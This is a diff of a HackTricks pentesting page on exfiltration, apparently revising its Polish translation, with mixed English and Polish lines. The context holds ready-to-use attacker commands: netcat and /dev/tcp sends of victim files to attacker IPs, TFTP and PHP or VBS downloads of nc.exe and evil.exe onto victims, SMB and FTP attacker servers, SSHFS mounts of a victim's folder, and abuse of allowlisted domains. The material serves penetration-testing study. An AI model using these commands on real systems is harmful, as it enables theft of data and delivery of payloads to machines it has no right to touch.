@@ -1,33 +1,25 @@
-# Wyciekanie danych
+# Exfiltration
 
 {% hint style="success" %}
-Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Wesprzyj HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
+## Powszechnie białe listy domen do eksfiltracji informacji
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć powszechnie białe listy domen, które można wykorzystać
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Powszechnie zezwolone domeny do wycieku informacji
-
-Sprawdź [https://lots-project.com/](https://lots-project.com/) aby znaleźć powszechnie zezwolone domeny, które mogą być nadużywane
-
-## Kopiuj i Wklej Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -63,10 +55,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Przesyłanie plików
+### Upload files
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer drukujący żądania GET i POST (również nagłówki)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Moduł Pythona [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Klient** systemu **Windows**
+### **Windows** klient
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -171,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Lub utwórz udział smb **za pomocą samba**:
+Lub utwórz udostępnienie smb **używając samby**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -202,22 +194,20 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Jeśli ofiara ma SSH, atakujący może zamontować katalog ofiary do atakującego.
+Jeśli ofiara ma SSH, atakujący może zamontować katalog z ofiary do atakującego.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-NC (Netcat) jest potężnym narzędziem do tworzenia połączeń sieciowych wiersza poleceń. Może być używany do przesyłania danych z jednego komputera na drugi poprzez sieć. Może być również wykorzystywany do otwierania portów na zdalnych maszynach, nasłuchiwania na określonych portach oraz wiele innych zastosowań.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Pobierz plik z ofiary
+### Pobierz plik od ofiary
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
@@ -251,33 +241,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Jeśli możesz wysyłać dane do serwera SMTP, możesz utworzyć serwer SMTP do odbierania danych za pomocą Pythona:
+Jeśli możesz wysłać dane do serwera SMTP, możesz stworzyć SMTP, aby odbierać dane za pomocą Pythona:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Domyślnie w systemach XP i 2003 (w innych systemach trzeba ją jawnie dodać podczas instalacji)
+Domyślnie w XP i 2003 (w innych musi być wyraźnie dodany podczas instalacji)
 
-W Kali **uruchom serwer TFTP**:
+W Kali, **uruchom serwer TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Serwer TFTP w pythonie:**
+**Serwer TFTP w Pythonie:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-W **ofierze**, połącz się z serwerem Kali:
+W **victim**, połącz się z serwerem Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Pobierz plik za pomocą jednolinijkowca w PHP:
+Pobierz plik za pomocą jednego wiersza PHP:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -319,13 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do odbudowywania ich z kodu szesnastkowego**. Oznacza to, że, dostarczając kod szesnastkowy binarnego pliku, `debug.exe` może wygenerować plik binarny. Jednak ważne jest zauważenie, że debug.exe ma **ograniczenie montażu plików do 64 kb**.
+Program `debug.exe` nie tylko umożliwia inspekcję plików binarnych, ale także ma **zdolność do odbudowywania ich z hex**. Oznacza to, że podając hex pliku binarnego, `debug.exe` może wygenerować plik binarny. Należy jednak zauważyć, że debug.exe ma **ograniczenie w zakresie składania plików do 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Następnie skopiuj tekst do okna powłoki systemu Windows, a zostanie utworzony plik o nazwie nc.exe.
+Następnie skopiuj i wklej tekst do windows-shell, a plik o nazwie nc.exe zostanie utworzony.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -333,23 +323,17 @@ Następnie skopiuj tekst do okna powłoki systemu Windows, a zostanie utworzony 
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Dowiedz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Wesprzyj HackTricks</summary>
+<summary>Wsparcie HackTricks</summary>
 
 * Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
-* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Udostępnij sztuczki hackingu, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.
+* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.
 
 </details>
 {% endhint %}
